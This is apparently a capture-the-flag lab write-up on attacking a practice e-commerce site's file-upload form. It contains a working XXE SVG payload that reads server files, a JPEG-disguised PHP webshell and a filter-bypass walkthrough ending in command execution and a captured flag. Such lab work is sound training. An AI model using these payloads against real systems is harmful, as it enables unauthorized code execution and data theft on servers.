You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

---

## Extra Exercise

Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.


![Pasted image 20250206180714.png](../../../IMAGES/Pasted%20image%2020250206180714.png)

Let's take a look at the site:

![Pasted image 20250206180859.png](../../../IMAGES/Pasted%20image%2020250206180859.png)

We got some sections that are interesting, the one I'm interested in the most is the contact us one, let's check it out:

![Pasted image 20250206181239.png](../../../IMAGES/Pasted%20image%2020250206181239.png)

And there we are, we have an upload feature, let's use burp and check the request:

![Pasted image 20250206182157.png](../../../IMAGES/Pasted%20image%2020250206182157.png)

We can `Do Intercept -> Response to this request`:

![Pasted image 20250206182227.png](../../../IMAGES/Pasted%20image%2020250206182227.png)

We need to erase the `CheckFile()` and change the `accept=`:

![Pasted image 20250206182356.png](../../../IMAGES/Pasted%20image%2020250206182356.png)

Now we are able to upload any kind of file, without the need of it being an image file, let's test the next thing:

## SVG XML Upload
---


We can now test if its possible to enumerate resources in the back-end server using `.svg` files, let's upload a file with the following contents:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname"> ]>
<svg>&xxe;</svg>
```

![Pasted image 20250206183458.png](../../../IMAGES/Pasted%20image%2020250206183458.png)

If we decode the contents of it:

![Pasted image 20250206183516.png](../../../IMAGES/Pasted%20image%2020250206183516.png)

It works, we are able to upload a malicious svg file, let's read the contents of `/upload.php`:


```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
 echo "Extension not allowed";
 die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
 echo "Only images are allowed";
 die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
 if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
 echo "Only images are allowed";
 die();
 }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
 echo "File too large";
 die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 displayHTMLImage($target_file);
} else {
 echo "File failed to upload";
}

```

Now we are able to see the whitelist and the blacklist of the upload endpoint, we can analyze the code and figure out the way to upload our webshell:

```ad-important
- **Blacklist Check**: Blocks`.php`,`.phps`,`.phtml`.
 
- **Whitelist Regex**: Requires the filename to end with`.[2-3 letters]g` (e.g.,`.jpg`,`.svg`).
- **MIME/Content-Type Check**: Must be`image/[a-z]{2,3}g` (e.g.,`image/svg+xml`).
- Uploads directory
- Format of the file, it goes by date of upload.
```

Let's send an intruder attack in the following way:

![Pasted image 20250206184336.png](../../../IMAGES/Pasted%20image%2020250206184336.png)

We were able to identify a valid extension: `.phar.jpeg`. Let's proceed.



With this on mind, we can do the following:

```ad-hint
1. Create a php webshell with the right mime-type to bypass the filters.
2. Create a file called `shell.phar.jpeg`.
3. Change the mime type of the file using hexeditor.
```


Let's do it, these are the contents of `shell.phar.jpeg`:

```
AAAA
<?php echo system($_GET["cmd"]);?>
```

Now, we need to change the `AAAA` contents using hexeditor:

![Pasted image 20250206185029.png](../../../IMAGES/Pasted%20image%2020250206185029.png)

Let's replace them for the JPEG bytes: `FF D8 FF DB`

![Pasted image 20250206185110.png](../../../IMAGES/Pasted%20image%2020250206185110.png)

Nice, now let's try uploading the file:

![Pasted image 20250206185201.png](../../../IMAGES/Pasted%20image%2020250206185201.png)

It worked, let's check if the webshell works, in my case, the url would go like this:

```
http://94.237.54.42:58431/contact/user_feedback_submissions/250206_shell.phar.jpeg?cmd=id
```

If we check:

![Pasted image 20250206185927.png](../../../IMAGES/Pasted%20image%2020250206185927.png)

We got it, let's send it to burp to be more comfortable, let's list the contents:

```
bin
boot
dev
etc
flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
var
```

We got our flag, let's read it:

![Pasted image 20250206190133.png](../../../IMAGES/Pasted%20image%2020250206190133.png)

Flag is:

```
HTB{m4573r1ng_upl04d_3xpl0174710n}
```


![Pasted image 20250206190210.png](../../../IMAGES/Pasted%20image%2020250206190210.png)

